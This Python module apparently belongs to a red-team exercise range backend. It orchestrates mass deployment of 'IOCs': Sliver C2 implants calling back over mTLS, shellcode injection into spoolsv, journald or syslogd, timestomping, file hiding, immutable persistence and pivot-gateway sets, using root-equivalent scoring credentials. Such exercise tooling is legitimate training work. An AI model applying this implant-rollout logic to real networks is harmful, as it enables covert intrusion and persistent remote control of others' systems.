"""Deploy-All-IOCs orchestration.

`run_deploy_all` is the background coroutine behind `POST /admin/deploy-all-iocs`.
It is a *parent* task that fans out one *child* OperatorTask per IOC, reusing the
existing single-IOC machinery verbatim:

  - ScriptCheck IOCs (with an effect deploy_script) → child `deploy` task driven
    by `routes.ioc_deploy._bg_deploy_and_register` (NXC).
  - non-inject SliverCheck IOCs (with an `implant_spec`) → child `generate_deploy`
    task driven by `routes.c2._bg_generate` (one shared binary per IOC deployed to
    every matching box, `auto_register=True`).

Design (see docs/PLAN_deploy_all_iocs.md):
  * Per-OS-shared binary: each implant IOC compiles once, `deploy_targets` = all
    matching boxes across the selected teams.
  * No deploy-all-local NXC throttle — the process-wide global semaphore in
    `netexec/nxc_semaphore.py` caps total `nxc` subprocesses, and implant compiles
    serialise on the Sliver compile lock. Children are gathered concurrently.
  * Parent-await: the parent awaits each child bg coroutine inline (they never
    raise out — both self-handle errors and call `finish_task` on the child), then
    re-derives the child's terminal status from its per-box progress so a missing
    credential surfaces as a failed IOC. Live UI updates ride the existing
    `operator_task_update` SSE feed that task_tracker already publishes.

Skipped (recorded as `status='skipped'` on the parent, never failing the run):
  implant IOCs missing an `implant_spec`, ScriptCheck IOCs without a deploy_script,
  IOCs with no matching boxes, IOCs already fully active (when `skip_active`), and —
  in DEV_MODE — implant/inject IOCs (no live Sliver to compile). Inject IOCs
  (`sliver_inject=True`) are now wired via `_do_inject`, which polls for an existing
  session and calls `_bg_inject_shellcode` (DoD 3 — session timeout → `failed`).
"""

from __future__ import annotations

import asyncio
import json
import logging
from typing import Any

from sqlalchemy import select
from sqlalchemy.orm import Session

from fastapi_backend.core.config import config
from fastapi_backend.core.task_tracker import (
    create_task,
    finish_task,
    start_task,
    update_box_progress,
    update_task_metadata,
)
from fastapi_backend.database.db_writer import engine
from fastapi_backend.database.models import Boxes, DeployedIOCs, OperatorTask
from iocs.base import DefaultCredCheck, ScriptCheck, SliverCheck

logger = logging.getLogger(__name__)

# IOC.os ("firewall") → Sliver goos ("freebsd"); windows/linux pass through.
_GOOS = {"windows": "windows", "linux": "linux", "firewall": "freebsd"}

# Patchable by tests to avoid 180-second wait in inject polling loop.
_INJECT_WAIT_S: int = 180
_INJECT_POLL_S: int = 5

# OS-specific default target process for sliver_inject IOCs. Each self_inject
# family targets a specific long-lived system process on its OS: Windows
# uses the Print Spooler, Linux the systemd journal, FreeBSD/pfSense syslogd
# — matches every self_inject IOC's description + remediation steps. The
# selector in routes/c2.py:_select_inject_pid then rejects critical-svchost
# variants (Windows) so a random spoolsv/journald/syslogd PID never lands on
# a critical process by accident.
_INJECT_TARGET_BY_OS: dict[str, str] = {
    "windows": "spoolsv",
    # Linux kernel truncates /proc/<pid>/comm to 15 chars (TASK_COMM_LEN=16
    # including the null terminator). "systemd-journald" (16 chars) shows up
    # as "systemd-journal" in the process listing sliver ps() returns, and
    # _select_inject_pid requires an exact match. Match on the truncated form
    # here so the inject actually finds the process; the IOC descriptions
    # keep the full name for human readers.
    "linux": "systemd-journal",
    "firewall": "syslogd",
}
_INJECT_TARGET_FALLBACK = "spoolsv"


def _load_inventory(team_nums: list[int] | None) -> dict[str, list[str]]:
    """Return {ioc_os: [box_ip, ...]} for boxes in scope (optionally team-filtered).

    Keyed by the IOC-facing OS label ("windows"/"linux"/"firewall") so it lines
    up directly with `ioc.os`.
    """
    wanted = set(team_nums) if team_nums is not None else None
    boxes_by_os: dict[str, list[str]] = {}
    with Session(engine) as db:
        for box in db.execute(select(Boxes)).scalars().all():
            if wanted is not None and box.team_num not in wanted:
                continue
            os_label = (box.os or "").lower()
            if not os_label:
                continue
            boxes_by_os.setdefault(os_label, []).append(box.box_ip)
    return boxes_by_os


def _active_pairs() -> set[tuple[str, str]]:
    """{(box_ip, ioc_name)} for every active DeployedIOCs row."""
    with Session(engine) as db:
        rows = db.execute(
            select(DeployedIOCs.box_ip, DeployedIOCs.ioc_name).where(
                DeployedIOCs.status == "active"
            )
        ).all()
    return {(r[0], r[1]) for r in rows}


def _dc_ips(team_nums: list[int] | None) -> set[str]:
    """{box_ip} for every Boxes.is_domain_controller=True row in scope.

    Used by _process to filter deploy targets for IOCs marked
    ``requires_dc=True`` (e.g. windows_adminsdholder), which touch AD directly
    and only make sense against the DC of each team.
    """
    wanted = set(team_nums) if team_nums is not None else None
    with Session(engine) as db:
        rows = db.execute(
            select(Boxes.box_ip, Boxes.team_num).where(
                Boxes.is_domain_controller.is_(True)
            )
        ).all()
    return {ip for ip, tnum in rows if wanted is None or tnum in wanted}


def _get_ioc_loader() -> Any:
    from fastapi_backend.routes.ioc_deploy import (
        _get_ioc_loader as loader,  # cycle-break
    )
    return loader()


def _child_progress(child_id: int) -> dict[str, Any]:
    with Session(engine) as db:
        child = db.get(OperatorTask, child_id)
        if child is None:
            return {}
        return json.loads(child.progress_json or "{}")


def _filter_iocs(
    definitions: dict[str, Any],
    ioc_names: list[str] | None,
) -> list[Any]:
    """Return deployable IOCs from ``definitions``, applying the deploy_all gate.

    Excludes DefaultCredCheck IOCs (scoring infra, never deployed onto boxes).
    Also excludes ``disabled=True`` IOCs unconditionally — even an explicit
    ``ioc_names`` list can't force one, because "disabled" means the IOC's
    deploy path is known to fail on every reachable range (see IOC.disabled
    docstring); running it anyway just clutters output and marks phantom
    fails against boxes the operator didn't misconfigure.
    With ``ioc_names=None`` (full-catalog run) also excludes
    ``deploy_all_default=False`` IOCs (opt-in only for high-blast-radius
    techniques). With an explicit list, still honors that flag as an
    override — only the ``disabled`` gate above is unconditional.
    """
    iocs = [
        ioc for ioc in definitions.values()
        if not isinstance(ioc.check, DefaultCredCheck)
        and not getattr(ioc, "disabled", False)
    ]
    if ioc_names is None:
        return [ioc for ioc in iocs if getattr(ioc, "deploy_all_default", True)]
    ioc_name_set = set(ioc_names)
    return [ioc for ioc in iocs if ioc.name in ioc_name_set]


async def run_deploy_all(
    parent_task_id: int,
    actor_username: str,
    *,
    include_implants: bool = True,
    skip_active: bool = True,
    team_nums: list[int] | None = None,
    ioc_names: list[str] | None = None,
) -> None:
    """Deploy + register every deployable IOC across all matching boxes.

    Parent progress (`progress_json`) is keyed by **ioc_name**; each entry's
    `details` carries `{child_task_id, deployed, failed}` (or `{reason}` for
    skips). Task-level totals land on `metadata_json`.
    """
    start_task(parent_task_id)

    loader = _get_ioc_loader()
    iocs_list = _filter_iocs(loader.ioc_definitions, ioc_names)
    boxes_by_os = _load_inventory(team_nums)
    active = _active_pairs() if skip_active else set()
    dc_ips_in_scope = _dc_ips(team_nums)

    counters = {
        "total_iocs": len(iocs_list),
        "deployed_iocs": 0,
        "skipped_iocs": 0,
        "failed_iocs": 0,
    }
    child_ids: list[int] = []
    # child_id -> every per-IOC verdict recorded against that child task. A
    # pivot set's three IOCs share one child, so the child's own terminal status
    # is the worst of the three, not the last one written.
    child_verdicts: dict[int, list[str]] = {}

    def _skip(ioc_name: str, reason: str) -> None:
        update_box_progress(
            parent_task_id, ioc_name, "skipped", details=json.dumps({"reason": reason})
        )
        counters["skipped_iocs"] += 1

    def _record(ioc_name: str, child_id: int, expected_ips: list[str] | None = None) -> None:
        """Re-derive child terminal status from per-box progress, mirror to parent.

        Re-stamps the child too, so late additions (e.g. boxes with no
        credential) are reflected in the child status.

        `expected_ips` scopes the verdict to the boxes this IOC actually owns.
        A pivot set's three IOCs all share ONE child task, so the fleet-wide
        `deployed`/`failed` tallies mix every member's boxes together — and that
        mixing is wrong in BOTH directions:

        * silent success — a run where only the GATEWAY landed still satisfied
          `deployed and not failed`, so both members reported "done". Measured
          2026-08-08: all 10 teams reported windows_implant_inject='done' and
          linux_implant_udev='done' while zero member beacons existed anywhere
          and only the gateways had connected.
        * false failure — a sibling member failing on ITS boxes dragged the whole
          set to "failed" even for an IOC whose own boxes all deployed. Measured
          2026-08-10: 11 pytest failures whose progress entry read
          `own_done == expected` next to a sibling-sourced `"failed": 2`.

        So when the caller knows which boxes this IOC owns, those boxes are the
        SOLE authority: a sibling's success is not this IOC's success, and a
        sibling's failure is not its failure. The fleet-wide `deployed`/`failed`
        counts stay in `details` for diagnostics only.

        The shared child task still gets the worst verdict recorded against it
        (failed > done > skipped) rather than whichever IOC happened to record
        last — one member failing must leave the child task itself "failed".
        """
        prog = _child_progress(child_id)
        deployed = sum(1 for e in prog.values() if e.get("status") == "done")
        failed = sum(1 for e in prog.values() if e.get("status") == "failed")

        missing: list[str] = []
        own_done: list[str] = []
        if expected_ips:
            own = {ip: (prog.get(ip) or {}).get("status") for ip in expected_ips}
            own_done = [ip for ip, st in own.items() if st == "done"]
            # A "skipped" own box is neutral (e.g. already active, or a team not
            # in this backend's inventory). Anything else — failed, still
            # running, or no progress entry at all — is unaccounted for.
            missing = [ip for ip, st in own.items() if st not in ("done", "skipped")]
            status = "failed" if missing else ("done" if own_done else "skipped")
        else:
            # "skipped" entries (e.g. teams not in this backend's inventory) are
            # neutral — don't let them drive status down to "failed".
            status = (
                "done" if (deployed and not failed)
                else ("skipped" if not failed else "failed")
            )

        verdicts = child_verdicts.setdefault(child_id, [])
        verdicts.append(status)
        child_status = (
            "failed" if "failed" in verdicts
            else ("done" if "done" in verdicts else "skipped")
        )
        finish_task(child_id, child_status)
        details = {"child_task_id": child_id, "deployed": deployed, "failed": failed}
        if expected_ips:
            details["expected"] = len(expected_ips)
            details["own_done"] = len(own_done)
            if missing:
                details["missing_boxes"] = missing[:10]
        update_box_progress(
            parent_task_id, ioc_name, status, details=json.dumps(details),
        )
        if status == "done":
            counters["deployed_iocs"] += 1
        elif status == "failed":
            counters["failed_iocs"] += 1
        else:
            counters["skipped_iocs"] += 1

    async def _do_script(ioc: Any, box_ips: list[str]) -> None:
        from fastapi_backend.netexec.wrapper import protocol_for_box  # cycle-break
        from fastapi_backend.routes.ioc_deploy import (  # cycle-break
            _bg_deploy_and_register,
            resolve_box_creds,
        )

        protocol, use_ps = protocol_for_box(ioc.os)
        update_box_progress(parent_task_id, ioc.name, "running")
        box_creds, unresolved = resolve_box_creds(box_ips, protocol, strict=False)
        child_id = create_task(
            task_type="deploy",
            operator=actor_username,
            team_num=None,
            target_boxes=box_ips,
            metadata={"ioc_name": ioc.name, "deploy_all_parent": parent_task_id},
        )
        child_ids.append(child_id)

        deployable = [ip for ip in box_ips if ip in box_creds]
        # Wrap the bg call so an unexpected raise still leaves the child + parent
        # in a terminal state via _record (no orphaned "running" child task).
        try:
            if deployable:
                await _bg_deploy_and_register(
                    task_id=child_id,
                    ioc=ioc,
                    box_ips=deployable,
                    ioc_name=ioc.name,
                    persistence_mechanism=None,
                    implant_identifier=None,
                    deployed_by=actor_username,
                    box_creds=box_creds,
                    protocol=protocol,
                    use_ps=use_ps,
                    timestomp=bool(getattr(ioc, "timestomp", False)),
                )
        except Exception:
            logger.exception("deploy_all: _bg_deploy_and_register raised for %s", ioc.name)
            # Fail only boxes the bg fn didn't already resolve (don't clobber done).
            done_so_far = _child_progress(child_id)
            for ip in deployable:
                if done_so_far.get(ip, {}).get("status") not in ("done", "failed"):
                    update_box_progress(child_id, ip, "failed", error="dispatch error")
        # Boxes with no credential never reach the bg fn — mark them explicitly so
        # the child (and the parent IOC entry, via _record) reflect the failure.
        for ip in unresolved:
            update_box_progress(child_id, ip, "failed", error="no credential resolved")

        _record(ioc.name, child_id)

    async def _do_implant(ioc: Any, box_ips: list[str]) -> None:
        from fastapi_backend.routes.c2 import (  # cycle-break
            ImplantGenerateRequest,
            _bg_generate,
            _find_matching_build,
        )

        spec = ioc.implant_spec
        goos = _GOOS.get(ioc.os, ioc.os)
        host = config.C2_IP or config.SLIVER_HOST
        c2_url = f"mtls://{host}:{config.MTLS_LISTENER_PORT}"

        # BUILD-first gate (docs/PLAN_build_check_deploy_name_pools.md §5A.5):
        # DEPLOY consumes a PRE-BUILT binary; it must never inline-compile. If no
        # matching build exists (BUILD wasn't run for this IOC), skip with a clear
        # reason rather than letting _bg_generate compile one on the deploy path.
        # `_find_matching_build` is the exact dedup predicate _bg_generate reuses,
        # so a hit here means the compile is skipped downstream.
        _itype = "beacon" if spec.is_beacon else "session"
        with Session(engine) as _db:
            _prebuilt = _find_matching_build(
                _db, goos, spec.arch, spec.format, _itype, c2_url,
                spec.persistence_name, pivot_gateway=False,
            )
        if _prebuilt is None:
            _skip(ioc.name, "not built — run BUILD first")
            return

        timestomp = (
            spec.timestomp
            if spec.timestomp is not None
            else bool(getattr(ioc, "timestomp", False))
        )
        body = ImplantGenerateRequest(
            os=goos,
            arch=spec.arch,
            format=spec.format,
            is_beacon=spec.is_beacon,
            beacon_interval=spec.beacon_interval,
            c2_url=c2_url,
            deploy_targets=box_ips,
            persistence_name=spec.persistence_name,
            apply_immutable=spec.apply_immutable,
            immutable_scope=spec.immutable_scope,
            auto_register=True,
            auto_register_ioc_name=ioc.name,
            timestomp=timestomp,
            # Propagate IOC-level backup_copy flag so _bg_generate can stage
            # the backup copy without re-querying the IOC loader itself.
            backup_copy_enabled=bool(getattr(ioc, "backup_copy", False)),
            enable_hiding=bool(getattr(ioc, "wants_hiding", None)),
            # IOC deploys authenticate as the root-equivalent scoring account
            # so the NXC put_file + persistence-apply step can write to
            # privileged deploy dirs (/usr/lib, /usr/local/bin, ...) — the
            # operator login on some ranges (testing_inventory blackteam) is
            # a non-root wheel user that gets EACCES from those dirs.
            use_scoring_cred=True,
        )
        update_box_progress(parent_task_id, ioc.name, "running")
        child_id = create_task(
            task_type="generate_deploy",
            operator=actor_username,
            team_num=None,
            target_boxes=box_ips,
            metadata={
                "ioc_name": ioc.name,
                "deploy_all_parent": parent_task_id,
                "os": goos,
            },
        )
        child_ids.append(child_id)
        try:
            await _bg_generate(child_id, body, actor_username)
        except Exception:
            logger.exception("deploy_all: _bg_generate raised for %s", ioc.name)
            done_so_far = _child_progress(child_id)
            for ip in box_ips:
                if done_so_far.get(ip, {}).get("status") not in ("done", "failed"):
                    update_box_progress(child_id, ip, "failed", error="dispatch error")
        _record(ioc.name, child_id)

    async def _do_inject(ioc: Any, box_ips: list[str]) -> None:
        """Deploy a sliver_inject IOC by waiting for a session then injecting.

        Requires an active Sliver session on each target box (placed by a
        concurrently-deploying beacon IOC or a pre-existing session).  Polls
        Boxes.session_id for up to INJECT_WAIT_SECONDS; on timeout marks the
        box failed with reason 'inject-session-timeout' (DoD 3).
        """
        from fastapi_backend.routes.c2 import _bg_inject_shellcode  # lazy-load

        _inject_wait_s = _INJECT_WAIT_S
        _inject_poll_s = _INJECT_POLL_S
        _default_target = _INJECT_TARGET_BY_OS.get(ioc.os, _INJECT_TARGET_FALLBACK)

        update_box_progress(parent_task_id, ioc.name, "running")
        child_id = create_task(
            task_type="deploy",
            operator=actor_username,
            team_num=None,
            target_boxes=box_ips,
            metadata={"ioc_name": ioc.name, "deploy_all_parent": parent_task_id},
        )
        child_ids.append(child_id)
        start_task(child_id)

        spec = getattr(ioc, "implant_spec", None)
        apply_imm = bool(spec.apply_immutable) if spec else False
        imm_scope = spec.immutable_scope if spec else "binary_only"

        for box_ip in box_ips:
            deadline = asyncio.get_event_loop().time() + _inject_wait_s
            found_session: str | None = None
            while asyncio.get_event_loop().time() < deadline:
                with Session(engine) as _db:
                    row = _db.execute(
                        select(Boxes).where(Boxes.box_ip == box_ip)
                    ).scalar_one_or_none()
                    if row and row.session_id:
                        found_session = row.session_id
                        break
                await asyncio.sleep(_inject_poll_s)

            if found_session is None:
                update_box_progress(child_id, box_ip, "failed",
                                    error="inject-session-timeout")
                continue

            await _bg_inject_shellcode(
                task_id=child_id,
                session_id=found_session,
                ioc=ioc,
                box_ip=box_ip,
                target_process=_default_target,
                operator=actor_username,
                apply_immutable=apply_imm,
                immutable_scope=imm_scope,
            )

        _record(ioc.name, child_id)

    # ── Pivot-set collection ──────────────────────────────────────────────────
    # IOCs sharing a pivot_set_name are grouped and routed through a coordinated
    # 3-implant generate path (_do_pivot_set → _generate_pivot_ioc_set) instead
    # of the standalone _do_implant path.  Built before _process so the guard
    # below can return early for all pivot-set members.
    _pivot_sets: dict[str, dict[str, Any]] = {}
    _pivot_ioc_names: set[str] = set()
    for _ioc in iocs_list:
        _psn = getattr(getattr(_ioc, "implant_spec", None), "pivot_set_name", None)
        if _psn is None:
            continue
        _pivot_ioc_names.add(_ioc.name)
        _bucket = _pivot_sets.setdefault(_psn, {})
        _is_gw = getattr(getattr(_ioc, "implant_spec", None), "pivot_gateway", False)
        if _is_gw:
            _bucket["gateway"] = _ioc
        elif _ioc.os == "linux":
            _bucket["linux"] = _ioc
        else:
            _bucket["windows"] = _ioc

    async def _do_pivot_set(set_name: str, bucket: dict[str, Any]) -> None:
        """Deploy a coordinated 3-implant pivot set (gateway + linux + windows)."""
        from fastapi_backend.routes.c2 import _generate_pivot_ioc_set  # lazy-load

        gateway_ioc = bucket.get("gateway")
        linux_ioc   = bucket.get("linux")
        windows_ioc = bucket.get("windows")

        all_iocs = [i for i in bucket.values() if i]

        if not gateway_ioc or gateway_ioc.implant_spec is None:
            for ioc in all_iocs:
                _skip(ioc.name, f"pivot set '{set_name}' has no gateway IOC or missing implant_spec")
            return

        if config.DEV_MODE:
            for ioc in all_iocs:
                _skip(ioc.name, "DEV_MODE: implant generation needs a live Sliver server")
            return

        if not include_implants:
            for ioc in all_iocs:
                _skip(ioc.name, "implants excluded by request")
            return

        fw_ips = list(boxes_by_os.get("firewall", []))
        if not fw_ips:
            for ioc in all_iocs:
                _skip(ioc.name, "no firewall boxes in scope for pivot set")
            return

        if skip_active:
            # Skip the set only when EVERY member is already active on every one
            # of its own boxes.
            #
            # This used to test the gateway alone and skip all three members on
            # that basis. That is a fair proxy only while the set's rows move
            # together — and they do not: any partial remediate, manual
            # deregister, box rebuild or test-side DELETE of a member row leaves
            # the gateway active while a member has no row. The members were then
            # skipped WITHOUT their own state ever being consulted, so they were
            # never planted, no row was created, and the parent task reported a
            # benign-looking "skipped". Those rows are scoring units, so the
            # silent version of this costs a blue team findable IOCs and a red
            # team credit. It is also unrecoverable: every later deploy-all with
            # skip_active took the same branch, so a drifted set stayed drifted.
            # Seen live 2026-08-06 — linux_implant_udev had no row on any box
            # while its gateway was active.
            pending_by_ioc = {
                ioc.name: [
                    ip for ip in boxes_by_os.get(ioc.os, [])
                    if (ip, ioc.name) not in active
                ]
                for ioc in all_iocs
            }
            if not any(pending_by_ioc.values()):
                for ioc in all_iocs:
                    _skip(ioc.name, "every pivot-set member already active on all its boxes")
                return
            # Some member is missing. The set compiles as a unit (member implants
            # are built against the gateway's pivot listener), so deploy the whole
            # set rather than trying to patch in the missing member alone.
            if not pending_by_ioc.get(gateway_ioc.name):
                logger.warning(
                    "deploy_all: pivot set '%s' is inconsistent — gateway %s is active "
                    "everywhere but members still pending %s; redeploying the whole set",
                    set_name, gateway_ioc.name,
                    {k: v for k, v in pending_by_ioc.items() if v},
                )

        with Session(engine) as _db:
            team_nums = sorted({
                b.team_num for b in _db.execute(
                    select(Boxes).where(Boxes.box_ip.in_(fw_ips), Boxes.team_num.isnot(None))
                ).scalars()
                if b.team_num is not None
            })

        if not team_nums:
            for ioc in all_iocs:
                _skip(ioc.name, "could not resolve team_nums for pivot set")
            return

        child_id = create_task(
            task_type="generate_deploy",
            operator=actor_username,
            team_num=None,
            target_boxes=fw_ips,
            metadata={
                "ioc_name": gateway_ioc.name,
                "deploy_all_parent": parent_task_id,
                "pivot_set_name": set_name,
            },
        )
        child_ids.append(child_id)
        for ioc in all_iocs:
            update_box_progress(parent_task_id, ioc.name, "running")

        try:
            await _generate_pivot_ioc_set(
                task_id=child_id,
                gateway_ioc=gateway_ioc,
                linux_ioc=linux_ioc,
                windows_ioc=windows_ioc,
                team_nums=team_nums,
                actor_username=actor_username,
            )
        except Exception:
            logger.exception("deploy_all: _generate_pivot_ioc_set raised for set '%s'", set_name)
            for ioc in all_iocs:
                update_box_progress(parent_task_id, ioc.name, "failed",
                                    error="pivot set dispatch error (see log)")
                counters["failed_iocs"] += 1
            finish_task(child_id, "failed")
            # RETURN. This loop used to fall through to the _record loop below,
            # which re-derives status from child progress and writes it to the
            # parent unconditionally — overwriting the "failed" just recorded and
            # reporting a dispatch that raised as "done"/"skipped".
            return

        # _record once per IOC so each gets its own parent progress_json entry.
        # All three share one child_id, so each is scored against ITS OWN boxes —
        # without that, the gateway landing alone makes both members report "done"
        # (see _record). Gateway owns the firewall boxes, members own theirs.
        for ioc in all_iocs:
            _record(ioc.name, child_id, expected_ips=list(boxes_by_os.get(ioc.os, [])))

    async def _process(ioc: Any) -> None:
        if ioc.name in _pivot_ioc_names:
            return  # routed via _do_pivot_set below
        name = ioc.name
        matching = list(boxes_by_os.get(ioc.os, []))
        if not matching:
            _skip(name, "no matching boxes in scope")
            return
        # requires_dc IOCs (e.g. windows_adminsdholder) only run on the DC of
        # each team — their deploy scripts touch AD directly via the
        # ActiveDirectory PowerShell module, which is only installed on DCs by
        # default. Otherwise every non-DC member of the scope would fail the
        # deploy with "module 'ActiveDirectory' was not loaded".
        if getattr(ioc, "requires_dc", False):
            matching = [ip for ip in matching if ip in dc_ips_in_scope]
            if not matching:
                _skip(name, "requires_dc=True but no DC in scope")
                return
        if skip_active:
            matching = [ip for ip in matching if (ip, name) not in active]
            if not matching:
                _skip(name, "all matching boxes already active")
                return

        try:
            if isinstance(ioc.check, SliverCheck):
                if getattr(ioc, "sliver_inject", False):
                    if config.DEV_MODE:
                        _skip(name, "DEV_MODE: inject IOC needs live Sliver server")
                        return
                    if not include_implants:
                        _skip(name, "implants excluded by request")
                        return
                    await _do_inject(ioc, matching)
                    return
                if not include_implants:
                    _skip(name, "implants excluded by request")
                    return
                if ioc.implant_spec is None:
                    _skip(name, "SliverCheck without implant_spec")
                    return
                if config.DEV_MODE:
                    _skip(name, "DEV_MODE: implant generation needs a live Sliver server")
                    return
                await _do_implant(ioc, matching)
            elif isinstance(ioc.check, ScriptCheck):
                if not ioc.deploy_script:
                    _skip(name, "ScriptCheck without effect deploy_script")
                    return
                await _do_script(ioc, matching)
            else:
                _skip(name, "unknown check type")
        except Exception:
            # Belt-and-suspenders: the bg fns shouldn't raise, but never let one
            # IOC abort the whole run.
            logger.exception("deploy_all: IOC %s raised", name)
            update_box_progress(
                parent_task_id, name, "failed",
                error="orchestration error (see backend log)",
            )
            counters["failed_iocs"] += 1

    # Two-phase dispatch: standalone inject IOCs (sliver_inject=True) need an
    # existing Sliver SESSION on the box, placed by a concurrently-deploying
    # session-mode implant. If everything runs at once, inject's 180 s session
    # poll starts at t=0 and races the SERIALIZED implant compile queue — the
    # session-provider may not compile+deploy+check in before the poll expires
    # (observed live: inject_stc timed out on boxes whose provider checked in
    # late). Run inject IOCs in a SECOND phase, after the providers have
    # deployed and begun checking in, so a session is (almost) always present
    # when inject starts polling. The 180 s poll remains the backstop for the
    # last few seconds of check-in latency.
    inject_names = {
        ioc.name for ioc in iocs_list
        if ioc.name not in _pivot_ioc_names
        and isinstance(ioc.check, SliverCheck)
        and getattr(ioc, "sliver_inject", False)
    }
    first_phase = [ioc for ioc in iocs_list if ioc.name not in inject_names]
    inject_phase = [ioc for ioc in iocs_list if ioc.name in inject_names]

    pivot_set_tasks = [_do_pivot_set(sn, bkt) for sn, bkt in _pivot_sets.items()]
    await asyncio.gather(*pivot_set_tasks, *[_process(ioc) for ioc in first_phase])
    if inject_phase:
        logger.info(
            "deploy_all: phase-1 done, running %d inject IOC(s) last so a session exists: %s",
            len(inject_phase), sorted(inject_names),
        )
        await asyncio.gather(*[_process(ioc) for ioc in inject_phase])

    update_task_metadata(parent_task_id, {**counters, "child_task_ids": child_ids})
    finish_task(parent_task_id, "failed" if counters["failed_iocs"] else "done")
    logger.info(
        "deploy_all complete (task=%s): deployed=%d skipped=%d failed=%d of %d IOCs",
        parent_task_id, counters["deployed_iocs"], counters["skipped_iocs"],
        counters["failed_iocs"], counters["total_iocs"],
    )
